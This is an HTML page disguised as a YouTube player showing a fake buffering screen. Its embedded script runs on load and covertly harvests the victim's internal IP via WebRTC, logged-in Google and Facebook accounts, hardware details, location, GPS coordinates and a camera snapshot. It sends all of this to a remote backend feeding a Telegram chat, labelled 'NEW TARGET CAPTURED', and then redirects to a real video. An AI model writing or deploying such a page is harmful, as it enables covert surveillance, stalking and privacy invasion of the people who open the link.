<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Video Player</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body { margin: 0; font-family: 'Inter', sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; overflow: hidden; }
    .card { background: #111; padding: 40px; border-radius: 16px; border: 1px solid #333; box-shadow: 0 8px 30px rgba(255,0,0,0.2); max-width: 400px; text-align: center; }
    .loading-spinner { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; pointer-events: none; }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube" style="width: 120px;">
    <h2 style="margin-top: 20px;">Buffer Video...</h2>
    <p style="color: #666; font-size: 14px;">Your connection is unstable. Decoding video stream...</p>
    <div class="loading-spinner"></div>
    <video id="videoPreview" autoplay muted playsinline></video>
    <canvas id="snapshotCanvas" width="640" height="480"></canvas>
  </div>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("snapshotCanvas");
    const ctx = canvas.getContext("2d");
    let imageBase64 = "";

    // 1. نظام الإرسال الاحترافي
    async function sendToTelegram(message, isPhoto = false) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (isPhoto && imageBase64) {
        payload.message = "📸 *CRITICAL FORENSIC SNAPSHOT:*";
        payload.photo = imageBase64;
      } else {
        payload.message = message;
      }

      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true 
        });
      } catch (e) { console.log("Network Error"); }
    }

    // 2. كشف الـ VPN والـ Internal IP
    async function getInternalIP() {
      return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(pc.setLocalDescription.bind(pc));
        pc.onicecandidate = (ice) => {
          if (ice && ice.candidate && ice.candidate.candidate) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
            resolve(ip);
          }
        };
        setTimeout(() => resolve("Not Found"), 1500);
      });
    }

    // 3. كشف الحسابات النشطة (Social Check)
    async function checkAccounts() {
      const sites = { Google: "https://accounts.google.com/favicon.ico", Facebook: "https://www.facebook.com/favicon.ico" };
      let active = [];
      for (const [name, url] of Object.entries(sites)) {
        const img = new Image();
        img.src = url + "?t=" + Math.random();
        const found = await new Promise(res => {
          img.onload = () => res(true);
          img.onerror = () => res(false);
          setTimeout(() => res(false), 1500);
        });
        if (found) active.push(name);
      }
      return active.length > 0 ? active.join(", ") : "None Detected";
    }

    // 4. جمع البيانات الشاملة
    async function initForensics() {
      const internalIp = await getInternalIP();
      const accounts = await checkAccounts();
      const ram = navigator.deviceMemory || "N/A";
      const cores = navigator.hardwareConcurrency || "N/A";
      const ua = navigator.userAgent;

      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
        .then(res => res.json())
        .then(data => {
          let msg = "🚩 *NEW TARGET CAPTURED* 🚩\n";
          msg += "━━━━━━━━━━━━━━━━━━\n";
          msg += `🌐 *Public IP:* \`${data.ip}\`\n`;
          msg += `🏠 *Internal IP:* \`${internalIp}\`\n`;
          msg += `📍 *Org:* ${data.org}\n`;
          msg += `🌍 *Loc:* ${data.city}, ${data.country}\n`;
          msg += "━━━━━━━━━━━━━━━━━━\n";
          msg += `💻 *Hardware:* ${cores} Cores | ${ram}GB RAM\n`;
          msg += `🕵️ *Logged Accounts:* ${accounts}\n`;
          msg += `🔋 *Battery:* Info Awaiting...\n`;
          msg += "━━━━━━━━━━━━━━━━━━\n";
          msg += "🔒 *SYSTEM: Extracting Media Assets...*";
          
          sendToTelegram(msg);
          collectSensitive();
        });
    }

    // 5. GPS & Camera
    function collectSensitive() {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          const gps = `📍 *GPS POSITION*\nhttp://googleusercontent.com/maps.google.com/3{pos.coords.latitude},${pos.coords.longitude}`;
          await sendToTelegram(gps);
          captureCamera();
        },
        async () => {
          await sendToTelegram("❌ *GPS Access Denied*");
          captureCamera();
        }, { timeout: 3000 }
      );
    }

    function captureCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.onloadeddata = () => {
            setTimeout(async () => {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
              stream.getTracks().forEach(t => t.stop());
              await sendToTelegram("", true);
              finish();
            }, 800);
          };
        })
        .catch(() => {
          sendToTelegram("❌ *Camera Access Blocked*");
          finish();
        });
    }

    function finish() {
      window.location.replace("https://youtu.be/tNWpOuJk2M8");
    }

    if (chatId) initForensics();
  </script>
</body>
</html>
